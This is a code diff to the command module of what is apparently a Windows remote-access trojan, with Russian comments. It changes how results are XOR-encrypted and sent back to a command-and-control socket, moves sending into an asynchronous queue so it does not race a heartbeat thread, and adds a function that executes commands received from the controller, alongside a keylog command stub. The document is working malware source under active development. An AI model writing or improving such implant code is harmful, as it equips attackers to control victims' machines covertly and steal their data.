@@ -1,6 +1,7 @@
 // Core/commands.cpp — WITH MODULE COMMAND ROUTING
 #include "commands.h"
 #include "loader.h"
+#include "network.h"
 #include <windows.h>
 #include <stdio.h>
 #include <string>
@@ -58,30 +59,37 @@ static void module_log(const char* msg) {
 
 static void module_send_result(const uint8_t* data, size_t len) {
     if (g_c2_socket == INVALID_SOCKET) return;
+
+        // Игнорируем пустые данные или данные, состоящие только из \r\n
+    bool only_whitespace = true;
+    for (size_t i = 0; i < len; i++) {
+        char c = data[i];
+        if (c != ' ' && c != '\t' && c != '\r' && c != '\n') {
+            only_whitespace = false;
+            break;
+        }
+    }
+    if (only_whitespace) return; // Не шлём мусор
     
+    // Проверяем, есть ли уже \n в конце
     bool has_newline = (len > 0 && data[len-1] == '\n');
     size_t total_len = has_newline ? len : len + 1;
     
-    uint8_t* encrypted = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, total_len);
-    if (!encrypted) return;
-    
+    // Шифруем данные
+    std::vector<uint8_t> enc(total_len);
     for (size_t i = 0; i < len; i++) {
-        encrypted[i] = data[i] ^ 0xAA;
+        enc[i] = data[i] ^ 0xAA;
     }
+    // Добавляем зашифрованный перевод строки, если нужно
     if (!has_newline) {
-        encrypted[len] = '\n';
+        enc[len] = '\n' ^ 0xAA;  // 0x0A ^ 0xAA = 0xA0
     }
     
-    const size_t CHUNK_SIZE = 65536;
-    size_t sent = 0;
-    while (sent < total_len) {
-        size_t to_send = (total_len - sent > CHUNK_SIZE) ? CHUNK_SIZE : (total_len - sent);
-        int res = send(g_c2_socket, (const char*)(encrypted + sent), (int)to_send, 0);
-        if (res <= 0) break;
-        sent += res;
-    }
-    
-    HeapFree(GetProcessHeap(), 0, encrypted);
+    // === КЛЮЧЕВОЕ ИЗМЕНЕНИЕ ===
+    // Отправляем через асинхронную очередь, а не напрямую
+    // Это предотвращает гонку с фоновым потоком хартбитов
+    push_to_send_queue(enc, 1);
+    // ==========================
 }
 // ==========================================
 
@@ -176,4 +184,16 @@ std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
     else if (cmd.find("keylog") != std::string::npos) return "KEYLOG_DISABLED";
     
     return "UNKNOWN_COMMAND";
+}
+
+// 3. PROCESS COMMAND (обёртка для heartbeat_loop)
+// ==========================================
+void process_command(const std::string& cmd, SOCKET sock) {
+    // Выполняем команду и получаем ответ
+    std::string result = execute_builtin_command(cmd, sock);
+    
+    // Отправляем ответ через асинхронную очередь
+    if (!result.empty()) {
+        send_encrypted(sock, result + "\n");
+    }
 }
